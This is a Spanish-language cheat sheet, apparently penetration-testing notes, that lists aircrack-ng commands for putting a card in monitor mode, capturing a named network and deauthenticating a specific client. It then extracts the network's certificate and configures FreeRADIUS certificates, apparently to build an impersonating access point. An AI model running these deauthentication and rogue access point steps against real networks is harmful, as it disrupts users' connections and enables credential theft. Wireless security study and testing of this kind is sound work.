### 1. Matar procesos activos
    sudo airmon-ng check kill

### 2. Iniciar modo monitor
    sudo airmon-ng start wlan0

### 3. Iniciar el proceso de captura y monitorización
    sudo airodump-ng wlan0mon

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/aabb93c4-6970-4fe9-bef4-3be2fa68be7c)

### 4. Iniciar captura y monitoreo de una red específica
    sudo airodump-ng -c 2 -w Playtronics wlan0mon

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/fbdd3c10-f6d9-430e-968f-110b7fcaa1cd)

### 5. Desautenticación en redes Wi-Fi
    sudo aireplay-ng -0 1 -a E8:9F:80:03:63:4A -c 40:B8:9A:F5:BB:19 wlan0mon

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/1e610701-d29d-4c99-8fe0-9f2678134813)

### 6. Detener modo monitor
    sudo airmon-ng stop wlan0mon

### 7. Abrir archivo *.cap con Wireshark
    sudo wireshark Playtronics-01.cap

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/76170b14-6a5b-472f-a944-c2a190a1d0cd)
![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/4b5460ed-7f9a-4df7-9b35-704555733ee6)

### 8. Revisar el certificado
    openssl x509 -inform der -in cert.der -text

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/db294efd-3989-4bd0-afe8-027041800b84)

### 9. Convertir certificado de DER a PEM
    openssl x509 -inform der -in cert.der -outform pem -out output.crt

### 10. Abrir *.crt
    cat output.crt

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/b647b7b2-5d37-4f03-8437-3704192f2806)

### 11. Configurar CA
    sudo mousepad /etc/freeradius/3.0/certs/ca.cnf
    
![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/f8439657-9651-4f76-af3c-cc5a17121e88)
![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/0a773e18-26fb-4704-b8ec-95851e7e23b9)

### 12. Configurar Servidor
    sudo mousepad /etc/freeradius/3.0/certs/server.cnf

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/2e89a53d-bb92-4d7e-a55d-54e75b1a192c)
![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/0a3c1be0-4166-4720-98d7-7a8eaa40dfd8)


















